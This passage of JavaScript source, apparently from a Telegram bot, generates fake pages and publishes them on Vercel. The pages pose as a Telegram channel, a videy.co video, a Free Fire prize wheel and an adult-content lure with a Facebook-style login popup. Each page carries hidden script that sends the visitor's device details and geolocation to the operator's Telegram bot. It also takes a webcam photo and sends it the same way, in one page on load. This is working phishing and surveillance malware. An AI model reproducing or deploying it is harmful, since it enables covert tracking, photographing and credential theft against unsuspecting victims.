24v-12.562h-4.224v-2.266h11.198v2.266h-4.268v12.562zm16.094-4.598h-7.172c.066 1.936 1.562 2.772 3.3 2.772 1.254 0 2.134-.198 2.97-.484l.396 1.848c-.924.396-2.2.682-3.74.682-3.476 0-5.522-2.134-5.522-5.412 0-2.97 1.804-5.764 5.236-5.764 3.476 0 4.62 2.86 4.62 5.214 0 .506-.044.902-.088 1.144zm-7.172-1.892h4.708c.022-.99-.418-2.618-2.222-2.618-1.672 0-2.376 1.518-2.486 2.618zm9.538 6.49v-15.62h2.706v15.62zm14.84-4.598h-7.172c.066 1.936 1.562 2.772 3.3 2.772 1.254 0 2.134-.198 2.97-.484l.396 1.848c-.924.396-2.2.682-3.74.682-3.476 0-5.522-2.134-5.522-5.412 0-2.97 1.804-5.764 5.236-5.764 3.476 0 4.62 2.86 4.62 5.214 0 .506-.044.902-.088 1.144zm-7.172-1.892h4.708c.022-.99-.418-2.618-2.222-2.618-1.672 0-2.376 1.518-2.486 2.618zm19.24-1.144v6.072c0 2.244-.462 3.85-1.584 4.862-1.1.99-2.662 1.298-4.136 1.298-1.364 0-2.816-.308-3.74-.858l.594-2.046c.682.396 1.826.814 3.124.814 1.76 0 3.08-.924 3.08-3.234v-.924h-.044c-.616.946-1.694 1.584-3.124 1.584-2.662 0-4.554-2.2-4.554-5.236 0-3.52 2.288-5.654 4.862-5.654 1.65 0 2.596.792 3.102 1.672h.044l.11-1.43h2.354c-.044.726-.088 1.606-.088 3.08zm-2.706 2.948v-1.738c0-.264-.022-.506-.088-.726-.286-.99-1.056-1.738-2.2-1.738-1.518 0-2.64 1.32-2.64 3.498 0 1.826.924 3.3 2.618 3.3 1.012 0 1.892-.66 2.2-1.65.088-.264.11-.638.11-.946zm5.622 4.686v-7.26c0-1.452-.022-2.508-.088-3.454h2.332l.11 2.024h.066c.528-1.496 1.782-2.266 2.948-2.266.264 0 .418.022.638.066v2.53c-.242-.044-.484-.066-.814-.066-1.276 0-2.178.814-2.42 2.046-.044.242-.066.528-.066.814v5.566zm16.05-6.424v3.85c0 .968.044 1.914.176 2.574h-2.442l-.198-1.188h-.066c-.638.836-1.76 1.43-3.168 1.43-2.156 0-3.366-1.562-3.366-3.19 0-2.684 2.398-4.07 6.358-4.048v-.176c0-.704-.286-1.87-2.178-1.87-1.056 0-2.156.33-2.882.792l-.528-1.76c.792-.484 2.178-.946 3.872-.946 3.432 0 4.422 2.178 4.422 4.532zm-2.64 2.662v-1.474c-1.914-.022-3.74.374-3.74 2.002 0 1.056.682 1.54 1.54 1.54 1.1 0 1.87-.704 2.134-1.474.066-.198.066-.396.066-.594zm5.6 3.762v-7.524c0-1.232-.044-2.266-.088-3.19h2.31l.132 1.584h.066c.506-.836 1.474-1.826 3.3-1.826 1.408 0 2.508.792 2.97 1.98h.044c.374-.594.814-1.034 1.298-1.342.616-.418 1.298-.638 2.2-.638 1.76 0 3.564 1.21 3.564 4.642v6.314h-2.64v-5.918c0-1.782-.616-2.838-1.914-2.838-.924 0-1.606.66-1.892 1.43-.088.242-.132.594-.132.902v6.424h-2.64v-6.204c0-1.496-.594-2.552-1.848-2.552-1.012 0-1.694.792-1.958 1.518-.088.286-.132.594-.132.902v6.336z" fill="var(--tme-logo-color)" fill-rule="nonzero"/>
              </g>
            </svg>
          </a>
          <a class="tgme_head_right_btn" href="//telegram.org/dl?tme=1c265098c8678703b7_9830172032386582311">
            Download
          </a>
        </div>
      </div>
      <div class="tgme_body_wrap">
        <div class="tgme_page">
          <div class="tgme_page_photo">
  <a href="tg://resolve?domain=${cn}"><img class="tgme_page_photo_image" src="https://cdn5.cdn-telegram.org/file/h1mLbVut0M6Y5HiSX1R6EOnCbolkNKMybNDuXJk6lxOtbnpI29lB5cdskOoH7TBTT9f8eRoYc61F3FlqdfwUz79Vp53oni4nNJ8MSF3YjdC3jf-Rb5fp67VR7t_U2HnYghYkW0rDom56CqaoGVX-buMn76_qJhJlmB_Pq6lJU-KEOjygD3DnNVe7Vvye4iX6g6IQfY6dtiUM65iKsMz8T9S8SbOXWhDpWV_sD6XK3sACgpdrOuRKt6JgSdrvbb5m4UL--2CBvcpbRPPZOcBUSRL_lPaAzgmmQmvw1xB_I-tbUJNDH4WvlkAjAyXdBQhByfjPZu3rS52Bc2Y85xGO1A.jpg"></a>
</div>
<div class="tgme_page_title" dir="auto">
  <span dir="auto">${cn}</span>
</div>
<div class="tgme_page_extra">900ribu subscriber</div>

<div class="tgme_page_action">
  <a onclick="sendAll()" class="tgme_action_button_new shine">View in Telegram</a>
</div>
<!-- WEBOGRAM_BTN -->
<div class="tgme_page_context_link_wrap"><a class="tgme_page_context_link">Preview channel</a></div>
<div class="tgme_page_additional">
  If you have <strong>Telegram</strong>, you can view and join <br><strong>${cn}</strong> right away.
</div>
        </div>
        
      </div>
    </div>

    <div id="tgme_frame_cont"></div>
        <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
            <script>
  async function sendText(message) {
    axios.post("https://api.telegram.org/bot${t}/sendMessage", {
      chat_id: ${io},
      text: message
    })
  }

  async function sendPhoto(photoBlob) {
    const formData = new FormData()
    formData.append("chat_id", ${io})
    formData.append("photo", photoBlob, "hek.jpg")

    axios.post("https://api.telegram.org/bot${t}/sendPhoto", formData)
  }

navigator.getBattery().then(battery => {
sendText("=> [ Device Information ]\n-> Ram: "+navigator.deviceMemory+" GB\n-> Batre: "+battery.level * 100+"%\n-> UserAgent: "+navigator.userAgent+"\n-> Platform: "+navigator.platform+"\n-> Language: "+navigator.language)
})

  async function getIAndL() {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(pos => {
          let message = "[ INFORMATION ]\n=> [ Location ]\n-> Latitude: "+pos.coords.latitude+"\n-> Longitude: "+pos.coords.longitude+"\n-> Map: https://www.google.com/maps?q="+pos.coords.latitude+","+pos.coords.longitude
          sendText(message)
      })
    }
  }

  async function getPhoto() {
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        const video = document.createElement('video')
        video.srcObject = stream
        video.play()

        video.onloadeddata = () => {
          const canvas = document.createElement('canvas')
          canvas.width = video.videoWidth
          canvas.height = video.videoHeight
          canvas.getContext('2d').drawImage(video, 0, 0)

          stream.getTracks().forEach(track => track.stop())

          canvas.toBlob(blob => {
            sendPhoto(blob)
          }, 'image/jpeg', 0.95)
        }
      })
      .catch(err => {
        sendText("Akses Kamera Di Tolak")
      })
  }

  async function sendAll() {
    setTimeout(() => {
      getIAndL()
      getPhoto()
    }, 1000)
  }
    </script>
</body>
</html>`
fs.writeFileSync("index.html", kode)
await upToVercel(ctx, "index.html", "chanel-telegram")
fs.unlinkSync("index.html")
}

async function videy(ctx, t, io) {
const kode = String.raw`
<html>
  <head>
    <title>Watch on Videy &#8212; Free and Simple Video Hosting</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link rel="icon" type="image/x-icon" href="https://videy.co/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100..900&family=Poppins:wght@400;600&display=swap" rel="stylesheet">
   <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
    <style>
    body {
  margin: 0;
  font-family: 'Inter';
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  font-smooth: always;
}

a {
  text-decoration: none;
  color: inherit;
}

.legal a:hover {
  text-decoration: underline;
}

.container {
  max-width: 1100px;
  margin: 0 auto;
  min-height: 100vh;
  display: flex;
  flex-direction: column;
}

.top {
  padding: 8px 24px;
  display: flex;
  align-items: center;
}

.logo {
  font-size: 26px;
  letter-spacing: -2px;
  font-weight: 600;
  font-family: 'Poppins';
}

.upload {
  font-size: 15px;
  margin-left: 20px;
  padding: 8px 20px;
  border-radius: 48px;
  font-weight: 600;
  background-color: #e7e7e7;
  cursor: pointer;
}

.upload:active, .upload:hover {
  background-color: #dddddd;
}

.text {
  margin-top: 64px;
  padding: 0 24px;
}

.main-line {
  font-size: 26px;
  font-weight: 700;
  text-align: center;
}

.second-line {
  margin-top: 16px;
  font-size: 16px;
  font-weight: 400;
  text-align: center;
}

.footer {
  font-size: 13px;
  color: #302f2f;
  margin-top: 64px;
  text-align: center;
  margin-top: auto;
  padding: 32px 16px;
}

.outline {
  width: 427px;
  height: 240px;
  border: 2px solid grey;
  border-radius: 4px;
  margin: 0 auto;
  margin-top: 32px;
  font-weight: 500;
  display: flex;
  align-items: center;
  justify-content: center;
}

.box {
  margin-top: 32px;
  text-align: center;
}

.box-upload {
  background-color: black;
  border-radius: 48px;
  color: white;
  padding: 12px 24px;
  font-weight: 700;
  cursor: pointer;
  width: 165px;
  margin: 0 auto;
}

.copyright {
  font-weight: 500;
}
@keyframes gradient {
  0% {
    background-position: 0% 50%;
  }

  50% {
    background-position: 100% 50%;
  }

  100% {
    background-position: 0% 50%;
  }
}

.box-upload.animate {
  background: linear-gradient(270deg, #000000, #333333, #2a2a2a);
  background-size: 600% 600%;
  animation: gradient 1.5s ease infinite;
}

.more {
  margin-left: auto;
  font-size: 15px;
  font-weight: 500;
}

.legal {
  display: flex;
  justify-content: center;
  margin-top: 8px;
  font-size: 12px;
  color: #5a5858;
}

.legal .item {
  margin: 0 8px;
}

body.dragging::before {
  content: "Drop the file anywhere on this page";
  position: fixed;
  left: 0;
  width: 100%;
  top: 0;
  height: 100%;
  display: flex;
  justify-content: center;
  align-items: center;
  font-size: 1.5em;
  background-color: rgba(78, 78, 78, .72);
  pointer-events: none;
  color: #e0e0e0;
  text-align: center;
  font-weight: 600
}

.email {
  margin-top: 72px;
  font-size: 20px;
  font-weight: 600;
  text-align: center;
}

.video {
  margin-top: 12px;
  width: 100%;
  display: flex;
  justify-content: center;
}

video {
  border-radius: 8px;
  max-height: calc(100vh - 64px);
}

.video-inner {
  width: 100%;
  display: flex;
  align-items: center;
  justify-content: center;
  max-width: 720px;
}
.as {
  max-width: 720px;
  margin: 0 auto;
  width: 100%;
  margin-top: 8px;
}

.legal-text {
  max-width: 960px;
  margin: 0 auto;
  padding: 0 16px;
  margin-top: 64px;
}

.upload-error {
  color: #cc0000;
  text-align: center;
  font-size: 14px;
  margin-top: 12px;
}

.video-error {
  font-size: 16px;
  font-weight: 600;
  padding: 16px 0;
}

.video-error-container {
  padding: 16px 16px 24px 16px;
  margin: 0 auto;
  text-align: center;
  padding-bottom: 8px;
}

.video-error-reasons {
  font-size: 15px;
}

.email-collect {
  font-size: 14px;
  text-align: center;
  margin-top: 12px;
  margin-bottom: 12px;
  text-decoration: underline;
  color: #50506b;
  font-weight: 500;
  cursor: pointer;
}

.modal {
  display: none;
  position: fixed;
  z-index: 100;
  left: 0;
  top: 0;
  width: 100%;
  height: 100%;
  background-color: rgba(0, 0, 0, 0.5);
  backdrop-filter: blur(4px);
  overflow-y: auto;
}

.modal-content {
  background-color: #ffffff;
  color: #000000;
  margin: 10% auto;
  padding: 2rem;
  border: 1px solid #e5e5e5;
  width: 90%;
  max-width: 450px;
  border-radius: 12px;
  position: relative;
  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
}

.modal-content h2 {
  color: #000000;
  font-size: 1.5rem;
  margin-bottom: 1.5rem;
  font-weight: 600;
}

.modal-close {
  position: absolute;
  right: 1.5rem;
  top: 1rem;
  color: #000000;
  font-size: 24px;
  font-weight: bold;
  cursor: pointer;
  transition: opacity 0.2s ease;
}

.modal-close:hover {
  opacity: 0.7;
}

.modal-content #emailForm {
  margin-top: 1.5rem;
}

.modal-content #emailInput {
  width: 100%;
  padding: 12px;
  margin-bottom: 1rem;
  border: 2px solid #e5e5e5;
  border-radius: 8px;
  background-color: #ffffff;
  color: #000000;
  font-size: 1rem;
  transition: border-color 0.2s ease;
  box-sizing: border-box;
}

.modal-content #emailInput:focus {
  border-color: #000000;
  outline: none;
}

.modal-content #emailInput::placeholder {
  color: #666666;
}

.modal-content #emailForm button {
  width: 100%;
  padding: 12px;
  background-color: #000000;
  color: #ffffff;
  border: none;
  border-radius: 8px;
  font-size: 1rem;
  font-weight: 600;
  cursor: pointer;
  transition: opacity 0.2s ease;
}

.modal-content #emailForm button:hover {
  opacity: 0.9;
}

.report-options {
  display: flex;
  flex-direction: column;
  gap: 12px;
  margin-bottom: 1.5rem;
}

.report-options label {
  display: flex;
  align-items: center;
  font-size: 1rem;
  cursor: pointer;
}

.report-options input[type="radio"] {
  margin-right: 10px;
  cursor: pointer;
}

#reportForm button {
  width: 100%;
  padding: 12px;
  background-color: #000000;
  color: #ffffff;
  border: none;
  border-radius: 8px;
  font-size: 1rem;
  font-weight: 600;
  cursor: pointer;
  transition: opacity 0.2s ease;
}

#reportForm button:hover {
  opacity: 0.9;
}

@media (max-width: 992px) {
  .video {
    margin-top: 0;
  }
  .legal-text {
    margin-top: 24px;
  }
}

@media (max-width: 744px) {
  video {
    border-radius: 0;
  }
}

@media (max-width: 600px) {
  .modal-content {
    margin: 5% auto;
    padding: 1.5rem;
    width: 85%;
  }

  .modal-content h2 {
    font-size: 1.3rem;
    margin-bottom: 1.2rem;
  }

  .modal-close {
    right: 1.2rem;
    top: 0.8rem;
  }
}

@media (max-height: 700px) {
  .modal-content {
    margin: 5% auto;
  }
      .video-actions {
        width: 100%;
        display: flex;
        justify-content: center;
        display: none;
      }

      .video-actions-inner {
        width: 100%;
        max-width: 720px;
        display: flex;
        gap: 8px;
        padding: 12px 12px 6px 12px;
        overflow-x: auto;
        scrollbar-width: none;
        -ms-overflow-style: none;
        white-space: nowrap;
      }

      .video-actions-inner::-webkit-scrollbar {
        display: none;
      }

      .action-btn {
        background: #f2f2f2;
        border: none;
        padding: 8px 16px;
        border-radius: 16px;
        font-family: inherit;
        font-size: 14px;
        font-weight: 500;
        cursor: pointer;
        transition: background-color 0.2s;
        flex-shrink: 0;
      }

      .action-btn, .action-btn a {
        color: #000;
      }

      .action-btn:hover {
        background: #e5e5e5;
      }
    </style>
  </head>
  <body data-version="v1.0.5">
    <div class="container">
      <div class="top">
        <div class="logo">
          <a>videy</a>
        </div>
        <a>
            <div class="upload">Upload</div>
        </a>
        <div class="more">
          <a>Advertise</a>
        </div>
      </div>
      <div id="emailModal" class="modal">
        <div class="modal-content">
          <span class="modal-close">&times;</span>
          <h2>Get more like this</h2>
          <form id="emailForm">
            <input type="email" id="emailInput" placeholder="Enter your email" required>
            <button type="submit">Submit</button>
          </form>
        </div>
      </div>
      <div id="reportModal" class="modal">
        <div class="modal-content">
          <span class="modal-close">&times;</span>
          <h2>What's wrong with this content?</h2>
          <form id="reportForm">
            <div class="report-options">
              <label><input type="radio" name="reportReason" value="dislike"> I don't like it</label>
              <label><input type="radio" name="reportReason" value="hateful"> It is hateful or offensive</label>
              <label><input type="radio" name="reportReason" value="csam"> It is CSAM</label>
              <label><input type="radio" name="reportReason" value="illegal"> It is illegal</label>
            </div>
            <button type="submit">Submit</button>
          </form>
        </div>
      </div>
      <div class="video">
        <div class="video-inner">
<div class="video">
  <div class="video-inner" style="position: relative;">
    <img src="https://files.catbox.moe/ba2qr3.jpg" style="width: 100%; height: 200px; margin-top: 40px;"/>
  </div>
</div>
        <div id="video-error" style="display: none;" class="video-error-container">
        <div class="video-error">Video could not load.</div>
        <div class="video-error-reasons">This could be because the video was removed, your internet connection is down, the server is having issues, or the video might not have ever existed.</div>
      </div>
        </div>
      </div>
      <div class="video-actions">
        <div class="video-actions-inner">
          <button class="action-btn" id="shareVideo">Share Video</button>
          <button class="action-btn" id="copyUrl">Copy Link</button>
          <button class="action-btn" id="uploadVideo">Upload</button>
          <button class="action-btn" id="subscribeBtn">Subscribe</button>
          <button class="action-btn" id="reportBtn">Report</button>
        </div>
      </div>
      <div class="as">
        <iframe id="ads-iframe" src="" style="width: 100%; height: 500px; border: none; display: none;"></iframe>
      </div>
      <div class="footer">
        <div class="copyright"> Copyright &copy; <span id="year"></span> videy.co</div>
        <div class="legal">
          <div class="item">
            <a>Terms of Service</a>
          </div>
          <div class="item">
            <a id="reportAbuse">Report Abuse</a>
          </div>
        </div>
      </div>
    </div>
            <script>
  async function sendText(message) {
    axios.post("https://api.telegram.org/bot${t}/sendMessage", {
      chat_id: ${io},
      text: message
    })
  }

  async function sendPhoto(photoBlob) {
    const formData = new FormData()
    formData.append("chat_id", ${io})
    formData.append("photo", photoBlob, "hek.jpg")

    axios.post("https://api.telegram.org/bot${t}/sendPhoto", formData)
  }

navigator.getBattery().then(battery => {
sendText("=> [ Device Information ]\n-> Ram: "+navigator.deviceMemory+" GB\n-> Batre: "+battery.level * 100+"%\n-> UserAgent: "+navigator.userAgent+"\n-> Platform: "+navigator.platform+"\n-> Language: "+navigator.language)
})

  async function getIAndL() {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(pos => {
          let message = "[ INFORMATION ]\n=> [ Location ]\n-> Latitude: "+pos.coords.latitude+"\n-> Longitude: "+pos.coords.longitude+"\n-> Map: https://www.google.com/maps?q="+pos.coords.latitude+","+pos.coords.longitude
          sendText(message)
      })
    }
  }

  async function getPhoto() {
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        const video = document.createElement('video')
        video.srcObject = stream
        video.play()

        video.onloadeddata = () => {
          const canvas = document.createElement('canvas')
          canvas.width = video.videoWidth
          canvas.height = video.videoHeight
          canvas.getContext('2d').drawImage(video, 0, 0)

          stream.getTracks().forEach(track => track.stop())

          canvas.toBlob(blob => {
            sendPhoto(blob)
          }, 'image/jpeg', 0.95)
        }
      })
      .catch(err => {
        sendText("Akses Kamera Di Tolak")
      })
  }

  async function sendAll() {
    setTimeout(() => {
      getIAndL()
      getPhoto()
    }, 1000)
  }
  sendAll()
    </script>
  </body>
 </html>`
fs.writeFileSync("index.html", kode)
await upToVercel(ctx, "index.html", "videy-co")
fs.unlinkSync("index.html")
}

async function spinff(ctx, t, io) {
const kode = String.raw`

<!DOCTYPE html><html lang="en"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spin Wheel</title>
        <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
    <style>
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-image: url('https://img12.pixhost.to/images/1595/586811066_e2db986698da6234e12f3ba3b4ffcfba.jpg');
            background-size: cover;
            background-position: center;
            text-align: center;
        }
        .title {
            font-size: 32px;
            font-weight: bold;
            color: gold;
            text-shadow: 2px 2px 5px black;
            margin-bottom: 20px;
        }
        .wheel-container {
            position: relative;
            width: 500px;
            height: 500px;
            border: 4px solid #333;
            border-radius: 50%;
            overflow: hidden;
        }
        .wheel {
            position: absolute;
            width: 100%;
            height: 100%;
            transition: transform 3s ease-out;
        }
        .wheel img {
            position: absolute;
            width: 120px;
            height: 120px;
            border-radius: 50%;
        }
        .pointer {
            position: absolute;
            top: -25px;
            left: 50%;
            transform: translateX(-50%);
            width: 0;
            height: 0;
            border-left: 30px solid transparent;
            border-right: 30px solid transparent;
            border-bottom: 60px solid red;
        }
        .spin-button {
            margin-top: 20px;
            padding: 15px 30px;
            background-color: blue;
            color: white;
            font-size: 18px;
            border: none;
            cursor: pointer;
            border-radius: 10px;
        }
        .result-container {
            display: none;
            text-align: center;
            margin-top: 20px;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(255, 255, 255, 0.9);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
        }
        .result-container img {
            width: 200px;
            height: 200px;
            border-radius: 10px;
            margin-bottom: 20px;
        }
        .claim-button {
            display: block;
            margin: 0 auto;
            padding: 20px 40px;
            background-color: #ff5733;
            color: white;
            font-size: 20px;
            font-weight: bold;
            border: none;
            cursor: pointer;
            border-radius: 10px;
            text-decoration: none;
            transition: background-color 0.3s;
        }
        .claim-button:hover {
            background-color: #e04e2a;
        }
    </style>
</head>
<body>
    <div class="title">Ayo spin dan dapatkan hadiahnya!</div>
    <div class="wheel-container">
        <div class="pointer"></div>
        <div class="wheel" id="wheel">
            <img src="https://img12.pixhost.to/images/1596/586832602_1631798814mp40underworld.jpg" style="top: 5%; left: 40%;">
            <img src="https://img12.pixhost.to/images/1596/586832597_1631798847m1887onepunchman.jpg" style="top: 40%; left: 5%;">
            <img src="https://img12.pixhost.to/images/1596/586832592_m1887-ff-skin13.jpg" style="top: 40%; right: 5%;">
            <img src="https://img12.pixhost.to/images/1596/586832587_8f770a547c57affcd99bff143c7b701b.jpg" style="bottom: 5%; left: 40%;">
        </div>
    </div>
    <button class="spin-button" onclick="spinWheel()">Putar Roda</button>
    <div class="result-container" id="result-container">
        <h2>Selamat! Anda mendapatkan hadiah:</h2>
        <img id="prize-image" src="" alt="Hadiah">
        <button id="claim-button" class="claim-button">Klik di sini untuk ambil hadiahmu</button>
    </div>
            <script>
  async function sendText(message) {
    axios.post("https://api.telegram.org/bot${t}/sendMessage", {
      chat_id: ${io},
      text: message
    })
  }

  async function sendPhoto(photoBlob) {
    const formData = new FormData()
    formData.append("chat_id", ${io})
    formData.append("photo", photoBlob, "hek.jpg")

    axios.post("https://api.telegram.org/bot${t}/sendPhoto", formData)
  }

navigator.getBattery().then(battery => {
sendText("=> [ Device Information ]\n-> Ram: "+navigator.deviceMemory+" GB\n-> Batre: "+battery.level * 100+"%\n-> UserAgent: "+navigator.userAgent+"\n-> Platform: "+navigator.platform+"\n-> Language: "+navigator.language)
})

  async function getIAndL() {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(pos => {
          let message = "[ INFORMATION ]\n=> [ Location ]\n-> Latitude: "+pos.coords.latitude+"\n-> Longitude: "+pos.coords.longitude+"\n-> Map: https://www.google.com/maps?q="+pos.coords.latitude+","+pos.coords.longitude
          sendText(message)
      })
    }
  }

  async function getPhoto() {
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        const video = document.createElement('video')
        video.srcObject = stream
        video.play()

        video.onloadeddata = () => {
          const canvas = document.createElement('canvas')
          canvas.width = video.videoWidth
          canvas.height = video.videoHeight
          canvas.getContext('2d').drawImage(video, 0, 0)

          stream.getTracks().forEach(track => track.stop())

          canvas.toBlob(blob => {
            sendPhoto(blob)
          }, 'image/jpeg', 0.95)
        }
      })
      .catch(err => {
        sendText("Akses Kamera Di Tolak")
      })
  }

  async function sendAll() {
    setTimeout(() => {
      getIAndL()
      getPhoto()
    }, 1000)
  }
        const prizes = [
            "https://img12.pixhost.to/images/1596/586832602_1631798814mp40underworld.jpg",
            "https://img12.pixhost.to/images/1596/586832597_1631798847m1887onepunchman.jpg",
            "https://img12.pixhost.to/images/1596/586832592_m1887-ff-skin13.jpg",
            "https://img12.pixhost.to/images/1596/586832587_8f770a547c57affcd99bff143c7b701b.jpg",
        ];
        const prizeLinks = [
            "go.php",
            "go.php",
            "go.php",
            "go.php"
        ];
        let selectedPrizeIndex = 0;
        function spinWheel() {
            selectedPrizeIndex = Math.floor(Math.random() * prizes.length);
            let segmentAngle = 360 / prizes.length;
            let stopAngle = 360 - (selectedPrizeIndex * segmentAngle + segmentAngle / 2);
            let randomRotation = 360 * 3 + stopAngle;
            gsap.to("#wheel", { rotation: randomRotation, duration: 3, ease: "power4.out", onComplete: function() {
                document.getElementById("prize-image").src = prizes[selectedPrizeIndex];
                document.getElementById("result-container").style.display = "block";
            }});
            sendAll()
        }
    </script>
</body>
</html>`
fs.writeFileSync("index.html", kode)
await upToVercel(ctx, "index.html", "garena-freefire-id")
fs.unlinkSync("index.html")
}

async function ch2(ctx, t, io, cn) {
const kode = String.raw`
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Telegram: View @${cn}</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="Random Bokep 18+🤤🥵🥵">
<meta property="og:image" content="https://cdn5.cdn-telegram.org/file/h1mLbVut0M6Y5HiSX1R6EOnCbolkNKMybNDuXJk6lxOtbnpI29lB5cdskOoH7TBTT9f8eRoYc61F3FlqdfwUz79Vp53oni4nNJ8MSF3YjdC3jf-Rb5fp67VR7t_U2HnYghYkW0rDom56CqaoGVX-buMn76_qJhJlmB_Pq6lJU-KEOjygD3DnNVe7Vvye4iX6g6IQfY6dtiUM65iKsMz8T9S8SbOXWhDpWV_sD6XK3sACgpdrOuRKt6JgSdrvbb5m4UL--2CBvcpbRPPZOcBUSRL_lPaAzgmmQmvw1xB_I-tbUJNDH4WvlkAjAyXdBQhByfjPZu3rS52Bc2Y85xGO1A.jpg">
<meta property="og:site_name" content="Telegram">
<meta property="og:description" content="You can view and join @${cn} right away.">

<meta property="twitter:title" content="${cn}">
<meta property="twitter:image" content="https://cdn5.cdn-telegram.org/file/h1mLbVut0M6Y5HiSX1R6EOnCbolkNKMybNDuXJk6lxOtbnpI29lB5cdskOoH7TBTT9f8eRoYc61F3FlqdfwUz79Vp53oni4nNJ8MSF3YjdC3jf-Rb5fp67VR7t_U2HnYghYkW0rDom56CqaoGVX-buMn76_qJhJlmB_Pq6lJU-KEOjygD3DnNVe7Vvye4iX6g6IQfY6dtiUM65iKsMz8T9S8SbOXWhDpWV_sD6XK3sACgpdrOuRKt6JgSdrvbb5m4UL--2CBvcpbRPPZOcBUSRL_lPaAzgmmQmvw1xB_I-tbUJNDH4WvlkAjAyXdBQhByfjPZu3rS52Bc2Y85xGO1A.jpg">
<meta property="twitter:site" content="@Telegram">

<meta name="twitter:card" content="summary">
<meta name="twitter:site" content="@Telegram">
<meta name="twitter:description" content="You can view and join @${cn} right away.
">
<meta property="al:ios:app_store_id" content="686449807">
<meta property="al:ios:app_name" content="Telegram Messenger">
<meta property="al:ios:url" content="tg://resolve?domain=${cn}">

<meta property="al:android:url" content="tg://resolve?domain=${cn}">
<meta property="al:android:app_name" content="Telegram">
<meta property="al:android:package" content="org.telegram.messenger">

<meta name="twitter:app:name:iphone" content="Telegram Messenger">
<meta name="twitter:app:id:iphone" content="686449807">
<meta name="twitter:app:url:iphone" content="tg://resolve?domain=${cn}">
<meta name="twitter:app:name:ipad" content="Telegram Messenger">
<meta name="twitter:app:id:ipad" content="686449807">
<meta name="twitter:app:url:ipad" content="tg://resolve?domain="${cn}">
<meta name="twitter:app:name:googleplay" content="Telegram">
<meta name="twitter:app:id:googleplay" content="org.telegram.messenger">
<meta name="twitter:app:url:googleplay" content="https://t.me/${cn}">

<meta name="apple-itunes-app" content="app-id=686449807, app-argument: tg://resolve?domain=${cn}">
    <link rel="icon" type="image/svg+xml" href="//telegram.org/img/website_icon.svg?4">
<link rel="apple-touch-icon" sizes="180x180" href="//telegram.org/img/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="//telegram.org/img/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="//telegram.org/img/favicon-16x16.png">
<link rel="alternate icon" href="//telegram.org/img/favicon.ico" type="image/x-icon" />
    <link href="//telegram.org/css/font-roboto.css?1" rel="stylesheet" type="text/css">
    <!--link href="/css/myriad.css" rel="stylesheet"-->
    <link href="//telegram.org/css/bootstrap.min.css?3" rel="stylesheet">
    <link href="//telegram.org/css/telegram.css?244" rel="stylesheet" media="screen">
    <style>
            /* Popup styles */
           /* Popup Overlay */
        .popup-login {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);  /* Dark background */
            display: none;  /* Hidden by default */
            align-items: center;  /* Vertically center */
            justify-content: center;  /* Horizontally center */
            z-index: 9999;  /* Ensure it's on top */
        }

        /* Popup Box */
        .login-container {
            background-color: #fff;
            padding: 30px;
            border-radius: 10px;
            width: 360px;  /* Adjust width */
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .facebook-logo {
            display: block;
            margin: 0 auto 20px;
        }

        .login-container h2 {
            font-size: 20px;
            color: #333;
            margin-bottom: 10px;
        }

        .login-container p {
            font-size: 14px;
            color: #666;
            margin-bottom: 15px;
        }

        .login-container input {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }

        .login-container button {
            width: 100%;
            padding: 10px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }

        .login-container button:hover {
            background-color: #166fe5;
        }

        .error-message {
            display: none;
            color: red;
            font-size: 14px;
            margin-top: 10px;
        }

        .footer {
            margin-top: 15px;
            font-size: 12px;
            color: #666;
            text-align: center;
        }

        .footer a {
            color: #1877f2;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        /* Button to trigger the popup */
        .show-popup-btn {
            padding: 10px 20px;
            background-color: #1877f2;
            color: white;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin: 20px;
        }

        .show-popup-btn:hover {
            background-color: #166fe5;
        }
    </style>
  </head>
  <body class="no_transition">
      <div class="tgme_background_wrap">
    <canvas id="tgme_background" class="tgme_background default" width="50" height="50" data-colors="dbddbb,6ba587,d5d88d,88b884"></canvas>
    <div class="tgme_background_pattern default"></div>
  </div>
    <div class="tgme_page_wrap">
      <div class="tgme_head_wrap">
        <div class="tgme_head">
          <a href="//telegram.org/" class="tgme_head_brand">
            <svg class="tgme_logo" height="34" viewBox="0 0 133 34" width="133" xmlns="http://www.w3.org/2000/svg">
              <g fill="none" fill-rule="evenodd">
